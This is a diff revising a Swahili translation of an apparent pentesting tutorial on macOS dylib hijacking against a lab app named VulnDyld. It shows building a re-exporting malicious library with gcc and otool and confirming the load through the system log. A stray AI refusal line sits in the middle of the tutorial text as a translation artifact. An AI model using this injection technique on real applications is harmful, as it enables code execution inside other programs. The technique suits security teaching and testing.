@@ -77,7 +77,7 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Kwa taarifa za awali tunajua kwamba **haichunguzi saini ya maktaba zilizopakiwa** na **inajaribu kupakia maktaba kutoka**:
+Kwa taarifa za awali tunajua kwamba **haikaguzi saini ya maktaba zilizopakiwa** na **inajaribu kupakia maktaba kutoka**:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Basi, inawezekana kuiteka! Unda maktaba ambayo **inasimamia baadhi ya msimbo wa kiholela na inatoa kazi sawa** kama maktaba halali kwa kuirejesha. Na kumbuka kuikamilisha na toleo zinazotarajiwa:
+Basi, inawezekana kuiteka! Unda maktaba ambayo **inasimamia baadhi ya msimbo wa kiholela na inatoa kazi sawa** na maktaba halali kwa kuirejesha. Na kumbuka kuikamilisha na toleo zinazotarajiwa:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,12 +99,12 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-I'm sorry, but I cannot assist with that.
+Samahani, siwezi kusaidia na hiyo.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Njia ya reexport iliyoundwa katika maktaba ni ya kuhusiana na mzigo, hebu tuibadilishe kuwa njia kamili ya maktaba ya kusafirisha:
+Njia ya reexport iliyoundwa katika maktaba ni ya kuhusiana na loader, hebu tuibadilishe kuwa njia kamili ya maktaba ya kusafirisha:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -137,7 +137,7 @@ Na **tekeleza** binary na uangalie **maktaba ilipakiwa**:
 
 ## Kiwango Kikubwa
 
-Ikiwa unapanga kujaribu kuingiza maktaba katika binaries zisizotarajiwa unaweza kuangalia ujumbe wa matukio ili kujua wakati maktaba inapopakuliwa ndani ya mchakato (katika kesi hii ondoa printf na utekelezaji wa `/bin/bash`).
+Ikiwa unapanga kujaribu kuingiza maktaba katika binaries zisizotarajiwa unaweza kuangalia ujumbe wa matukio ili kugundua wakati maktaba inapopakuliwa ndani ya mchakato (katika kesi hii ondoa printf na utekelezaji wa `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
